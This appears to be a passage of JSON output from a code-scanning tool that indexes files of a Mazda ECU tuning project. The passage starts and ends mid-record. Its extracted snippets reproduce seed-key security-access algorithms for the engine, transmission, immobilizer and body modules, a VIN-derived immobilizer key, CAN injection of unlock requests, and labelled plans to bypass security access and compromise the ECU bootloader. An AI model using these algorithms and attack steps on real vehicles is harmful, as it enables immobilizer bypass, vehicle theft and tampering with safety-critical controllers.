'Throttle body learning'},"}, {"type": "protocol", "line": 117, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm_adapt': {'address': 0xFFC500, 'size': 0x300, 'description': 'Transmission adaptation'}"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "'bootloader': {'address': 0xFF0000, 'size': 0x1000, 'description': 'Boot sector - reprogramming'},"}, {"type": "protocol", "line": 121, "protocol": "0x[0-9A-Fa-f]+", "content": "'security_registers': {'address': 0xFFFF00, 'size': 0x100, 'description': 'Security access control'}"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "'checksum_area': {'address': 0xFFFFF0, 'size': 0x10, 'description': 'ECU checksums'}"}, {"type": "protocol", "line": 262, "protocol": "CAN", "content": "self.can_injection = CANInjection()"}, {"type": "protocol", "line": 265, "protocol": "J2534", "content": "\"\"\"J2534 PROTOCOL VULNERABILITIES\"\"\""}, {"type": "protocol", "line": 270, "protocol": "CAN", "content": "'exploit': 'CAN ID spoofing + sequence number prediction'"}, {"type": "protocol", "line": 275, "protocol": "0x[0-9A-Fa-f]+", "content": "'exploit': 'Exploit 0x23 0x2A 0x3D services'"}, {"type": "protocol", "line": 279, "protocol": "0x[0-9A-Fa-f]+", "content": "'target': '0x27 security service',"}, {"type": "protocol", "line": 312, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"BUILD 0x23 READ MEMORY PAYLOAD\"\"\""}, {"type": "protocol", "line": 315, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x23)  # Service ID"}, {"type": "protocol", "line": 323, "protocol": "CAN", "content": "class CANInjection:"}, {"type": "protocol", "line": 324, "protocol": "CAN", "content": "\"\"\"ADVANCED CAN BUS MESSAGE INJECTION\"\"\""}, {"type": "protocol", "line": 331, "protocol": "CAN", "content": "\"\"\"MAZDASPEED 3 SPECIFIC CAN IDENTIFIERS\"\"\""}, {"type": "protocol", "line": 333, "protocol": "0x[0-9A-Fa-f]+", "content": "'engine_ecu': 0x7E0,"}, {"type": "protocol", "line": 334, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm': 0x7E1,"}, {"type": "protocol", "line": 335, "protocol": "0x[0-9A-Fa-f]+", "content": "'abs': 0x7E2,"}, {"type": "protocol", "line": 336, "protocol": "0x[0-9A-Fa-f]+", "content": "'airbag': 0x7E3,"}, {"type": "protocol", "line": 337, "protocol": "0x[0-9A-Fa-f]+", "content": "'cluster': 0x7E4,"}, {"type": "protocol", "line": 338, "protocol": "0x[0-9A-Fa-f]+", "content": "'immobilizer': 0x7E5"}, {"type": "protocol", "line": 345, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x10)  # Service"}, {"type": "protocol", "line": 362, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, 0x01]),  # Request seed"}, {"type": "protocol", "line": 379, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, 0x02]) + bytes.fromhex(key),  # Send key"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "FULL SECURITY BYPASS & AUTONOMOUS TUNING FOR STOCK 2011 MAZDASPEED 3"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "class MazdaECUExploit:"}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "\"\"\"COMPLETE MAZDASPEED 3 ECU EXPLOITATION FRAMEWORK\"\"\""}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "self.security_level = \"FACTORY_DEALER_ACCESS\""}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "self.ecu_memory_map = self.map_ecu_memory()"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "'ecu_access_27': {"}, {"type": "hardware", "line": 27, "hardware": "ECU", "content": "'description': 'Main ECU security access (0x27)',"}, {"type": "hardware", "line": 33, "hardware": "TCM", "content": "'tcm_access_27': {"}, {"type": "hardware", "line": 35, "hardware": "TCM", "content": "'algorithm': self._mazda_tcm_algorithm,"}, {"type": "hardware", "line": 40, "hardware": "immobilizer", "content": "'immobilizer_27': {"}, {"type": "hardware", "line": 41, "hardware": "immobilizer", "content": "'description': 'Immobilizer system access',"}, {"type": "hardware", "line": 42, "hardware": "immobilizer", "content": "'algorithm': self._mazda_immobilizer_algorithm,"}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "hardware", "line": 64, "hardware": "TCM", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "hardware", "line": 65, "hardware": "ECU", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "hardware", "line": 65, "hardware": "TCM", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "hardware", "line": 77, "hardware": "immobilizer", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "hardware", "line": 78, "hardware": "immobilizer", "content": "\"\"\"IMMOBILIZER ALGORITHM - TRIPLE DES BASED\"\"\""}, {"type": "hardware", "line": 92, "hardware": "immobilizer", "content": "\"\"\"DERIVE VIN-BASED KEY FOR IMMOBILIZER\"\"\""}, {"type": "hardware", "line": 93, "hardware": "ECU", "content": "vin = self._read_vin()  # Read VIN from ECU"}, {"type": "hardware", "line": 98, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "def map_ecu_memory(self):"}, {"type": "hardware", "line": 103, "hardware": "ECU", "content": "\"\"\"COMPLETE MEMORY MAP OF MZR DISI ECU\"\"\""}, {"type": "hardware", "line": 117, "hardware": "TCM", "content": "'tcm_adapt': {'address': 0xFFC500, 'size': 0x300, 'description': 'Transmission adaptation'}"}, {"type": "hardware", "line": 119, "hardware": "ECU", "content": "'security_areas': {"}, {"type": "hardware", "line": 121, "hardware": "ECU", "content": "'security_registers': {'address': 0xFFFF00, 'size': 0x100, 'description': 'Security access control'}"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "'checksum_area': {'address': 0xFFFFF0, 'size': 0x10, 'description': 'ECU checksums'}"}, {"type": "hardware", "line": 273, "hardware": "ECU", "content": "'method': 'Dump entire ECU memory via extended diagnostics',"}, {"type": "hardware", "line": 274, "hardware": "ECU", "content": "'target': 'ECU flash memory',"}, {"type": "hardware", "line": 277, "hardware": "ECU", "content": "'security_bypass': {"}, {"type": "hardware", "line": 278, "hardware": "ECU", "content": "'method': 'Bypass security access without valid key',"}, {"type": "hardware", "line": 279, "hardware": "ECU", "content": "'target': '0x27 security service',"}, {"type": "hardware", "line": 283, "hardware": "ECU", "content": "'method': 'Compromise ECU bootloader for permanent access',"}, {"type": "hardware", "line": 284, "hardware": "ECU", "content": "'target': 'Boot sector of ECU',"}, {"type": "hardware", "line": 290, "hardware": "ECU", "content": "def execute_memory_dump(self):"}, {"type": "hardware", "line": 291, "hardware": "ECU", "content": "\"\"\"DUMP COMPLETE ECU MEMORY VIA DIAGNOSTIC EXPLOIT\"\"\""}, {"type": "hardware", "line": 295, "hardware": "ECU", "content": "for area_name, area_info in MazdaECUExploit().ecu_memory_map.items():"}, {"type": "hardware", "line": 324, "hardware": "CAN bus", "content": "\"\"\"ADVANCED CAN BUS MESSAGE INJECTION\"\"\""}, {"type": "hardware", "line": 328, "hardware": "ECU", "content": "self.ecu_ids = self.enumerate_ecu_ids()"}, {"type": "hardware", "line": 330, "hardware": "ECU", "content": "def enumerate_ecu_ids(self):"}, {"type": "hardware", "line": 333, "hardware": "ECU", "content": "'engine_ecu': 0x7E0,"}, {"type": "hardware", "line": 334, "hardware": "TCM", "content": "'tcm': 0x7E1,"}, {"type": "hardware", "line": 335, "hardware": "ABS", "content": "'abs': 0x7E2,"}, {"type": "hardware", "line": 338, "hardware": "immobilizer", "content": "'immobilizer': 0x7E5"}, {"type": "hardware", "line": 341, "hardware": "ECU", "content": "def inject_diagnostic_session(self, target_ecu, session_type):"}, {"type": "hardware", "line": 349, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 355, "hardware": "ECU", "content": "return f\"Started {session_type} session on {target_ecu}\""}, {"type": "hardware", "line": 357, "hardware": "ECU", "content": "def security_access_attack(self, target_ecu):"}, {"type": "hardware", "line": 358, "hardware": "ECU", "content": "\"\"\"AUTOMATED SECURITY ACCESS ATTACK\"\"\""}, {"type": "hardware", "line": 361, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 374, "hardware": "ECU", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "hardware", "line": 378, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 384, "hardware": "ECU", "content": "return f\"Security access granted to {target_ecu}\""}, {"type": "hardware", "line": 386, "hardware": "ECU", "content": "return \"Security access failed\""}, {"type": "hardware", "line": 390, "hardware": "ECU", "content": "print(\"MAZDASPEED 3 COMPLETE SECURITY & TUNING EXPLOITATION\")"}, {"type": "hardware", "line": 394, "hardware": "ECU", "content": "ecu_exploit = MazdaECUExploit()"}, {"type": "hardware", "line": 399, "hardware": "ECU", "content": "print(\"\\n1. ECU SECURITY ACCESS BYPASS\")"}, {"type": "hardware", "line": 403, "hardware": "ECU", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "hardware", "line": 407, "hardware": "ECU", "content": "print(\"\\n2. ECU MEMORY MAP EXPLOITATION\")"}, {"type": "hardware", "line": 409, "hardware": "ECU", "content": "for area_name, area in ecu_exploit.ecu_memory_map.items():"}, {"type": "hardware", "line": 450, "hardware": "ECU", "content": "dump_payloads = diagnostic_exploits.execute_memory_dump()"}], "security_logic": [{"type": "security_pattern", "line": 11, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 12, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 12, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 19, "pattern": "key", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 19, "pattern": "seed", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 19, "pattern": "algorithm", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 23, "pattern": "key", "content": "def reverse_engineer_seed_key(self):"}, {"type": "security_pattern", "line": 23, "pattern": "seed", "content": "def reverse_engineer_seed_key(self):"}, {"type": "security_pattern", "line": 24, "pattern": "key", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 24, "pattern": "seed", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 24, "pattern": "algorithm", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 25, "pattern": "algorithm", "content": "algorithms = {"}, {"type": "security_pattern", "line": 28, "pattern": "algorithm", "content": "'algorithm': self._mazda_27_algorithm,"}, {"type": "security_pattern", "line": 29, "pattern": "seed", "content": "'seed_bytes': 4,"}, {"type": "security_pattern", "line": 30, "pattern": "key", "content": "'key_bytes': 4,"}, {"type": "security_pattern", "line": 35, "pattern": "algorithm", "content": "'algorithm': self._mazda_tcm_algorithm,"}, {"type": "security_pattern", "line": 36, "pattern": "seed", "content": "'seed_bytes': 2,"}, {"type": "security_pattern", "line": 37, "pattern": "key", "content": "'key_bytes': 2,"}, {"type": "security_pattern", "line": 42, "pattern": "algorithm", "content": "'algorithm': self._mazda_immobilizer_algorithm,"}, {"type": "security_pattern", "line": 43, "pattern": "seed", "content": "'seed_bytes': 8,"}, {"type": "security_pattern", "line": 44, "pattern": "key", "content": "'key_bytes': 8,"}, {"type": "security_pattern", "line": 45, "pattern": "key", "content": "'vulnerability': 'DES with weak key derivation'"}, {"type": "security_pattern", "line": 48, "pattern": "algorithm", "content": "return algorithms"}, {"type": "security_pattern", "line": 50, "pattern": "seed", "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "security_pattern", "line": 51, "pattern": "algorithm", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "security_pattern", "line": 53, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 54, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 58, "pattern": "key", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "security_pattern", "line": 58, "pattern": "seed", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "security_pattern", "line": 59, "pattern": "key", "content": "key[i] = (key[i] & 0xFF) ^ 0xA9"}, {"type": "security_pattern", "line": 60, "pattern": "key", "content": "key[i] = (key[i] + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 62, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 64, "pattern": "seed", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "security_pattern", "line": 64, "pattern": "algorithm", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "security_pattern", "line": 65, "pattern": "algorithm", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "security_pattern", "line": 66, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 67, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 70, "pattern": "key", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 70, "pattern": "seed", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 71, "pattern": "key", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 71, "pattern": "seed", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 72, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 73, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 75, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 77, "pattern": "seed", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "security_pattern", "line": 77, "pattern": "algorithm", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "security_pattern", "line": 78, "pattern": "algorithm", "content": "\"\"\"IMMOBILIZER ALGORITHM - TRIPLE DES BASED\"\"\""}, {"type": "security_pattern", "line": 80, "pattern": "key", "content": "vin_key = self._derive_vin_key()"}, {"type": "security_pattern", "line": 81, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 84, "pattern": "key", "content": "des_key = vin_key[:8]  # Use first 8 bytes of derived key"}, {"type": "security_pattern", "line": 85, "pattern": "key", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 85, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 85, "pattern": "cipher", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 86, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 86, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 87, "pattern": "key", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 87, "pattern": "encrypt", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 87, "pattern": "seed", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 89, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 91, "pattern": "key", "content": "def _derive_vin_key(self):"}, {"type": "security_pattern", "line": 92, "pattern": "key", "content": "\"\"\"DERIVE VIN-BASED KEY FOR IMMOBILIZER\"\"\""}, {"type": "security_pattern", "line": 97, "pattern": "key", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 97, "pattern": "hash", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 98, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "security_pattern", "line": 98, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "security_pattern", "line": 100, "pattern": "key", "content": "return key[:24]  # 24 bytes for 3DES"}, {"type": "security_pattern", "line": 148, "pattern": "algorithm", "content": "\"\"\"REAL-TUNE AI TUNING ALGORITHM\"\"\""}, {"type": "security_pattern", "line": 278, "pattern": "key", "content": "'method': 'Bypass security access without valid key',"}, {"type": "security_pattern", "line": 280, "pattern": "key", "content": "'exploit': 'Timing attack on seed-key validation'"}, {"type": "security_pattern", "line": 280, "pattern": "seed", "content": "'exploit': 'Timing attack on seed-key validation'"}, {"type": "security_pattern", "line": 357, "pattern": "security_access", "content": "def security_access_attack(self, target_ecu):"}, {"type": "security_pattern", "line": 360, "pattern": "seed", "content": "seed_msg = can.Message("}, {"type": "security_pattern", "line": 362, "pattern": "seed", "content": "data=bytes([0x27, 0x01]),  # Request seed"}, {"type": "security_pattern", "line": 365, "pattern": "seed", "content": "self.bus.send(seed_msg)"}, {"type": "security_pattern", "line": 371, "pattern": "seed", "content": "seed_response = self._receive_seed()"}, {"type": "security_pattern", "line": 372, "pattern": "seed", "content": "if seed_response:"}, {"type": "security_pattern", "line": 373, "pattern": "seed", "content": "seed = seed_response[2:6]  # Extract seed bytes"}, {"type": "security_pattern", "line": 374, "pattern": "key", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 374, "pattern": "seed", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 374, "pattern": "algorithm", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 377, "pattern": "key", "content": "key_msg = can.Message("}, {"type": "security_pattern", "line": 379, "pattern": "key", "content": "data=bytes([0x27, 0x02]) + bytes.fromhex(key),  # Send key"}, {"type": "security_pattern", "line": 382, "pattern": "key", "content": "self.bus.send(key_msg)"}, {"type": "security_pattern", "line": 402, "pattern": "seed", "content": "test_seed = \"A1B2C3D4\""}, {"type": "security_pattern", "line": 403, "pattern": "key", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 403, "pattern": "seed", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 403, "pattern": "algorithm", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 404, "pattern": "key", "content": "print(f\"Seed: {test_seed} -> Key: {calculated_key}\")"}, {"type": "security_pattern", "line": 404, "pattern": "seed", "content": "print(f\"Seed: {test_seed} -> Key: {calculated_key}\")"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds2.py", "lines_read": 390, "features_found": [{"type": "function", "name": "__init__", "line": 39}, {"type": "function", "name": "_initialize_algorithms", "line": 43}, {"type": "function", "name": "calculate_seed_key", "line": 55}, {"type": "function", "name": "_algorithm_27_standard", "line": 88}, {"type": "function", "name": "_algorithm_27_enhanced", "line": 112}, {"type": "function", "name": "_algorithm_tcm", "line": 144}, {"type": "function", "name": "_algorithm_immobilizer", "line": 163}, {"type": "function", "name": "_derive_immobilizer_key", "line": 186}, {"type": "function", "name": "_algorithm_bcm", "line": 200}, {"type": "function", "name": "_algorithm_manufacturer", "line": 226}, {"type": "function", "name": "_get_manufacturer_key", "line": 244}, {"type": "function", "name": "_algorithm_calibration", "line": 254}, {"type": "function", "name": "request_seed", "line": 284}, {"type": "function", "name": "_get_seed_length_for_level", "line": 309}, {"type": "function", "name": "send_key", "line": 322}, {"type": "function", "name": "perform_security_access", "line": 346}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.kdf.pbkdf2", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Optional,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}, {"type": "import", "module": "hashes", "line": null}, {"type": "import", "module": "PBKDF2HMAC", "line": null}, {"type": "import", "module": "random", "line": null}], "components_found": [{"type": "class", "name": "MazdaSecurityAlgorithm", "line": 23}, {"type": "class", "name": "MazdaSecurityAccess", "line": 33}], "algorithms": [{"type": "algorithm_function", "line": 43, "content": "def _initialize_algorithms(self) -> Dict[MazdaSecurityAlgorithm, callable]:"}, {"type": "algorithm_function", "line": 55, "content": "def calculate_seed_key(self, seed: bytes, algorithm: MazdaSecurityAlgorithm,"}, {"type": "algorithm_function", "line": 88, "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 112, "content": "def _algorithm_27_enhanced(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 144, "content": "def _algorithm_tcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 163, "content": "def _algorithm_immobilizer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 186, "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "algorithm_function", "line": 200, "content": "def _algorithm_bcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 226, "content": "def _algorithm_manufacturer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 254, "content": "def _algorithm_calibration(self, seed: bytes, vin: Optional[str] = None,"}], "protocols": [{"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "ALGORITHM_27_STANDARD = 1      # Standard 0x27 security"}, {"type": "protocol", "line": 91, "protocol": "0x[0-9A-Fa-f]+", "content": "Standard 0x27 Security Algorithm"}, {"type": "protocol", "line": 102, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = seed[i] ^ 0x73"}, {"type": "protocol", "line": 104, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + i) & 0xFF"}, {"type": "protocol", "line": 106, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0xA9"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "Enhanced 0x27 Security Algorithm"}, {"type": "protocol", "line": 129, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 3) | (temp >> 5)) & 0xFF"}, {"type": "protocol", "line": 132, "protocol": "0x[0-9A-Fa-f]+", "content": "temp ^= [0x47, 0x11, 0x83, 0x25][i]"}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x2D + i) & 0xFF"}, {"type": "protocol", "line": 138, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (~temp & 0xFF) ^ 0xA5"}, {"type": "protocol", "line": 156, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 157, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 158, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 159, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 216, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x84) & 0xFF"}, {"type": "protocol", "line": 217, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0x3D"}, {"type": "protocol", "line": 218, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp >> 2) | (temp << 6)) & 0xFF"}, {"type": "protocol", "line": 219, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp - 0x17) & 0xFF"}, {"type": "protocol", "line": 220, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ [0xA2, 0x4F, 0x8C, 0x31][i]"}, {"type": "protocol", "line": 274, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (seed_byte + data_byte) & 0xFF"}, {"type": "protocol", "line": 275, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0xB5"}, {"type": "protocol", "line": 276, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 4) | (temp >> 4)) & 0xFF"}, {"type": "protocol", "line": 277, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x2A) & 0xFF"}, {"type": "protocol", "line": 278, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ [0x91, 0x3C, 0x67, 0xA8, 0x42, 0x7D][i]"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 7, "hardware": "ECU", "content": "MAZDA SECURITY ACCESS - Reverse Engineered Algorithms"}, {"type": "hardware", "line": 8, "hardware": "ECU", "content": "Complete security access implementation for all Mazda ECUs"}, {"type": "hardware", "line": 23, "hardware": "ECU", "content": "class MazdaSecurityAlgorithm(IntEnum):"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "\"\"\"Mazda Security Algorithms - Reverse Engineered\"\"\""}, {"type": "hardware", "line": 25, "hardware": "ECU", "content": "ALGORITHM_27_STANDARD = 1      # Standard 0x27 security"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "ALGORITHM_27_ENHANCED = 2      # Enhanced security"}, {"type": "hardware", "line": 27, "hardware": "TCM", "content": "ALGORITHM_TCM = 3              # Transmission control module"}, {"type": "hardware", "line": 28, "hardware": "immobilizer", "content": "ALGORITHM_IMMOBILIZER = 4      # Immobilizer system"}, {"type": "hardware", "line": 29, "hardware": "BCM", "content": "ALGORITHM_BCM = 5              # Body control module"}, {"type": "hardware", "line": 33, "hardware": "ECU", "content": "class MazdaSecurityAccess:"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "Complete Mazda Security Access Implementation"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "Reverse engineered from IDS/M-MDS security algorithms"}, {"type": "hardware", "line": 41, "hardware": "vehicle", "content": "self.vehicle_key_cache = {}"}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "def _initialize_algorithms(self) -> Dict[MazdaSecurityAlgorithm, callable]:"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "\"\"\"Initialize all security algorithms\"\"\""}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_27_STANDARD: self._algorithm_27_standard,"}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_27_ENHANCED: self._algorithm_27_enhanced,"}, {"type": "hardware", "line": 48, "hardware": "ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_TCM: self._algorithm_tcm,"}, {"type": "hardware", "line": 48, "hardware": "TCM", "content": "MazdaSecurityAlgorithm.ALGORITHM_TCM: self._algorithm_tcm,"}, {"type": "hardware", "line": 49, "hardware": "ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_IMMOBILIZER: self._algorithm_immobilizer,"}, {"type": "hardware", "line": 49, "hardware": "immobilizer", "content": "MazdaSecurityAlgorithm.ALGORITHM_IMMOBILIZER: self._algorithm_immobilizer,"}, {"type": "hardware", "line": 50, "hardware": "ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_BCM: self._algorithm_bcm,"}, {"type": "hardware", "line": 50, "hardware": "BCM", "content": "MazdaSecurityAlgorithm.ALGORITHM_BCM: self._algorithm_bcm,"}, {"type": "hardware", "line": 51, "hardware": 